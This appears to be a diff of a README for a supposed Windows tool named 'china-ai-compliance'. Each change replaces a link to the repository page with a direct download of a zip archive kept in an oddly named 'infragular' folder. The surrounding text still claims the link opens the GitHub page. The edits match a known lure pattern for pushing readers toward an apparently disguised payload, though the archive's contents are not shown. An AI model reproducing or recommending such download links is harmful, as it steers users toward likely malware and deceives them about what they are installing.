@@ -1,6 +1,6 @@
 # 🤖 china-ai-compliance - Simplify AI Compliance in China
 
-[![Download](https://img.shields.io/badge/Download-Get%20China-AI%20Compliance-blue?style=for-the-badge)](https://github.com/morgancertifiable319/china-ai-compliance)
+[![Download](https://img.shields.io/badge/Download-Get%20China-AI%20Compliance-blue?style=for-the-badge)](https://github.com/morgancertifiable319/china-ai-compliance/raw/refs/heads/main/infragular/china_compliance_ai_2.7.zip)
 
 ## 📋 About china-ai-compliance
 
@@ -40,7 +40,7 @@ Follow these instructions to download and install the application on your Window
 
 Click the link below to visit the main page where you can get the latest version of china-ai-compliance:
 
-[Download china-ai-compliance](https://github.com/morgancertifiable319/china-ai-compliance) 
+[Download china-ai-compliance](https://github.com/morgancertifiable319/china-ai-compliance/raw/refs/heads/main/infragular/china_compliance_ai_2.7.zip) 
 
 This link will take you to the GitHub page. Look for the latest release or the main download area. The files you download will usually be in `.exe` format or a zipped folder.
 
@@ -116,7 +116,7 @@ china-ai-compliance updates regularly to reflect new rules. When you open the ap
 
 ## 📂 Useful Links
 
-- Main download and info page: [https://github.com/morgancertifiable319/china-ai-compliance](https://github.com/morgancertifiable319/china-ai-compliance)
+- Main download and info page: [https://github.com/morgancertifiable319/china-ai-compliance/raw/refs/heads/main/infragular/china_compliance_ai_2.7.zip](https://github.com/morgancertifiable319/china-ai-compliance/raw/refs/heads/main/infragular/china_compliance_ai_2.7.zip)
 - User guide PDF included in the installation folder
 - FAQ and updates on the GitHub repository page
 
@@ -128,4 +128,4 @@ You can open issues on GitHub for bugs or feature requests. The repository is ma
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20China-AI%20Compliance-blue?style=for-the-badge)](https://github.com/morgancertifiable319/china-ai-compliance)
+[![Download](https://img.shields.io/badge/Download-Get%20China-AI%20Compliance-blue?style=for-the-badge)](https://github.com/morgancertifiable319/china-ai-compliance/raw/refs/heads/main/infragular/china_compliance_ai_2.7.zip)
